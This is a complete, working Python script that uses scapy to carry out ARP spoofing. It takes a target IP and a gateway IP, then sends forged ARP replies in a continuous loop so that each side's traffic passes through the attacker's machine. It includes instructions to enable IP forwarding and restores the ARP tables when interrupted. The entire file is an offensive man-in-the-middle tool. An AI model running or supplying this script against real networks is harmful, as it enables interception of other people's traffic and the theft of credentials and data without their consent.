#!/usr/bin/env python3

# must enable ip forwarding on the target:
# echo 1 > /proc/sys/ipv4/ip_forward

import scapy.all as scapy
import time
import sys
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target_ip', dest='target_ip',
                      help='Target IP.  \nRun: echo 1 > /proc/sys/net/ipv4/ip_forward')
    parser.add_option('-g', '--gateway_ip', dest='gateway_ip',
                      help='Gateway Router IP.  \nRun: echo 1 > /proc/sys/net/ipv4/ip_forward')
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error(
            '[-] Please specify a target ip. Use --help for more info.')
    if not options.gateway_ip:
        parser.error(
            '[-] Please specify a gateway router ip. Use --help for more info.')

    return options


def get_mac(ip):
    # Use ARP to ask who has target IP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4,)


options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
    sent_packets_count = 0
    while True:

        # tell target we are router
        spoof(target_ip, gateway_ip)
        # tell the router we are the target
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print('\r[+] Packets sent: ' + str(sent_packets_count), end='\r')
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:

    print('[+] Detected CTRL + C ... Resetting ARP tables... Please wait', end='\r')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
